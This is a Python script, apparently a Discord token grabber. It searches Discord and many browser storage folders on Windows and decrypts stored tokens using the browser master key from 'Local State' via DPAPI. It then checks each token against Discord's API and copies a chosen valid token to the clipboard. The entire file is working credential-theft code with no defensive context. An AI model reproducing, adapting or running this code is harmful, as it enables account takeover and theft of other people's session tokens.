import os
import re
import requests
import base64
import json
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from colorama import Fore, init
import clipboard

init(autoreset=True)
valid_tokens = {}
seen_tokens = set()
ascii_art = r'''

              .__                 
  ____ _______|  |   ____   ____  
_/ __ \\___   /  |  /  _ \ / ___\ 
\  ___/ /    /|  |_(  <_> ) /_/  >
 \___  >_____ \____/\____/\___  / 
     \/      \/          /_____/  


'''

print(Fore.RED + ascii_art)
print("=" * 40)
print()
print()

def fetch_tokens_and_usernames():
     regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"
     encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"
     paths = {
          'Discord': os.path.join(os.getenv("APPDATA"), 'Discord', 'Local Storage', 'leveldb'),
          'Discord Canary': os.path.join(os.getenv("APPDATA"), 'DiscordCanary', 'Local Storage', 'leveldb'),
          'Discord PTB': os.path.join(os.getenv("APPDATA"), 'discordptb', 'Local Storage', 'leveldb'),
          'Opera': os.path.join(os.getenv("APPDATA"), 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
          'Opera GX': os.path.join(os.getenv("APPDATA"), 'Opera Software', 'Opera GX Stable', 'Local Storage', 'leveldb'),
          'Amigo': os.path.join(os.getenv("LOCALAPPDATA"), 'Amigo', 'User Data', 'Local Storage', 'leveldb'),
          'Torch': os.path.join(os.getenv("LOCALAPPDATA"), 'Torch', 'User Data', 'Local Storage', 'leveldb'),
          'Kometa': os.path.join(os.getenv("LOCALAPPDATA"), 'Kometa', 'User Data', 'Local Storage', 'leveldb'),
          'Orbitum': os.path.join(os.getenv("LOCALAPPDATA"), 'Orbitum', 'User Data', 'Local Storage', 'leveldb'),
          'CentBrowser': os.path.join(os.getenv("LOCALAPPDATA"), 'CentBrowser', 'User Data', 'Local Storage', 'leveldb'),
          '7Star': os.path.join(os.getenv("LOCALAPPDATA"), '7Star', '7Star', 'User Data', 'Local Storage', 'leveldb'),
          'Sputnik': os.path.join(os.getenv("LOCALAPPDATA"), 'Sputnik', 'Sputnik', 'User Data', 'Local Storage', 'leveldb'),
          'Firefox ESR': os.path.join(os.getenv("APPDATA"), 'Mozilla', 'Firefox ESR', 'Profiles'),
          'Vivaldi': os.path.join(os.getenv("LOCALAPPDATA"), 'Vivaldi', 'User Data', 'Default', 'Local Storage', 'leveldb'),
          'Chrome SxS': os.path.join(os.getenv("LOCALAPPDATA"), 'Google', 'Chrome SxS', 'User Data', 'Local Storage', 'leveldb'),
          'Chrome': os.path.join(os.getenv("LOCALAPPDATA"), 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'),
          'Microsoft Edge': os.path.join(os.getenv("LOCALAPPDATA"), 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Storage', 'leveldb'),
          'Uran': os.path.join(os.getenv("LOCALAPPDATA"), 'uCozMedia', 'Uran', 'User Data', 'Default', 'Local Storage', 'leveldb'),
          'Yandex': os.path.join(os.getenv("LOCALAPPDATA"), 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
          'Brave': os.path.join(os.getenv("LOCALAPPDATA"), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
          'Iridium': os.path.join(os.getenv("LOCALAPPDATA"), 'Iridium', 'User Data', 'Default', 'Local Storage', 'leveldb'),
          'Firefox': os.path.join(os.getenv("APPDATA"), 'Mozilla', 'Firefox', 'Profiles'),
          'Firefox Nightly': os.path.join(os.getenv("APPDATA"), 'Mozilla', 'Firefox Nightly', 'Profiles'),
     }

     def decrypt_stuff(buff, master_key) -> str:
          try:
                iv = buff[3:15]
                payload = buff[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted_stuff = cipher.decrypt(payload)
                decrypted_stuff = decrypted_stuff[:-16].decode()
                return decrypted_stuff
          except Exception:
                pass

     def get_decryption_key(path) -> str:
          with open(path, "r", encoding="utf-8") as f:
                temp = f.read()
          local = json.loads(temp)
          decryption_key = base64.b64decode(local["os_crypt"]["encrypted_key"])
          decryption_key = decryption_key[5:]
          decryption_key = CryptUnprotectData(decryption_key, None, None, None, 0)[1]
          return decryption_key

     def check_token(tkn, name, printed_apps, token_number=None):
          if tkn in seen_tokens:
                return False
          seen_tokens.add(tkn)

          response = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": tkn})
          if response.status_code == 200:
                user_info = response.json()
                if name not in printed_apps:
                     print(f"{token_number}. Token found in {name}: {tkn}, Username: {user_info['username']}#{user_info['discriminator']}")
                     printed_apps.add(name)
                     valid_tokens[token_number] = tkn
                     return True
          else:
                print(f"Token found in {name}: {tkn}, Invalid token")
                return False

     printed_apps = set()
     token_number = 1

     for name, path in paths.items():
          if not os.path.exists(path):
                continue

          local_state_path = os.path.join(os.getenv("APPDATA"), name.replace(" ", "").lower(), 'Local State')
          if not os.path.exists(local_state_path):
                print(f"Local State file not found for {name}. Skipping...")
                continue

          for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                     continue

                try:
                     with open(os.path.join(path, file_name), 'r', errors='ignore') as file:
                          for line in file:
                                encrypted_tokens = re.findall(encrypted_regex, line)
                                for encrypted_token in encrypted_tokens:
                                     try:
                                          decrypted_token = decrypt_stuff(base64.b64decode(encrypted_token.split('dQw4w9WgXcQ:')[1]), get_decryption_key(local_state_path))
                                          if check_token(decrypted_token, name, printed_apps, token_number):
                                                token_number += 1
                                     except Exception as e:
                                          print(f"Error decrypting token in {name}: {e}")
                except Exception as e:
                     print(f"Error reading from {name}: {e}")

     if valid_tokens:
          while True:
                choice = input("enter the number of the token you want to copy: ")
                try:
                     clipboard.copy(valid_tokens[int(choice)])
                     print(f"copied token {choice} to clipboard.")
                     break
                except (KeyError, ValueError):
                     print("invalid choice. please enter a valid token number.")
     else:
          print("no valid tokens found.")


if __name__ == '__main__':
     fetch_tokens_and_usernames()
     input("press Enter to close...")
